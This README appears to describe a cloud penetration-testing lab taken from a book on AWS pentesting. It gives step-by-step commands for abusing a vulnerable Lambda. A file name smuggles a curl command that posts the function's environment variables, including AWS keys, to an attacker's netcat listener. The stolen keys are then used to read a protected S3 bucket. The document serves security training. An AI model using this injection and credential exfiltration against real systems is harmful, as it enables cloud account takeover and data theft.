# vulnerable_lambda

## Scenario
**Note** This scenario requires your machine to be reachable from its public IP address.
In the video, a cloud kali instance is used which was deployed in the same environment/region/zone as the vulnerable functoin, hence the private ip can be used. Also ensure the Netcat listening port is not blocked by security group!


Starting out with access keys for user 'Bob' (inside attacker or stolen creds), 
explore the permissions of the key.
Discover that Bob is able to `s3:Get*, s3:Put*, lambda:listFunctions, lambda:getFunction`.

List all buckets (allowed).
Try to list the contents of the `MySecretBucket-[id]` (not allowed).

List the lambda functions and discover a vulnerable function (`s3-zip-counter-[id]`).
Fetch the lambda's code and run a static code scan (using `bandit`).
Discover a code injection vulnerability.
Exploit this to POST the lambda's `env` to your machine (netcat) or a server you control.
In the posted env, discover AWS access keys and install them in your local CLI.
Then use the newly created profile to list the contents of the `MySecretBucket-[id]`.

## Commands

```
pip3 install bandit

aws configure --profile bob

aws s3 ls --profile bob
aws s3 ls MySecretBucket-[id] --profile bob

aws lambda list-functions --profile bob
aws lambda get-function --function-name [function name] --profile bob

wget "<function URL>"
unzip s3...
```
Unzip the downloaded file.

```
pip3 install bandit
bandit -r [location of lambda_function.py]
```

Create payload file:
```
ip a

touch 'hello;curl -X POST -d "`env`" [your public reachable IP];.zip'
touch 'hello;curl -X POST -d "`env`" 172.31.29.23;.zip'

aws s3 ls s3://fc-lambda-bucket-284ab91da09dale/ --profile bob
aws s3 ls s3://fc-lambda-bucket-284ab91da09dale/Uploads/ --profile bob

```

Open Netcat listener and then upload the created file to the bucket:
```
nc -nlvp 4444

aws s3 cp [payload] s3://fc-lambda-bucket-284ab91da09dale/Uploads/ --profile bob
```
Get the env from Lambda and copy the AWS creds in a new profile (eve).
Then
```
aws s3 ls --profile eve
aws s3 ls s3://mysecretbucket-[id] --profile eve
```

## Creds
This example was taken from the book "Hands-on AWS penetration testing with Kali Linux", Chapter 12.
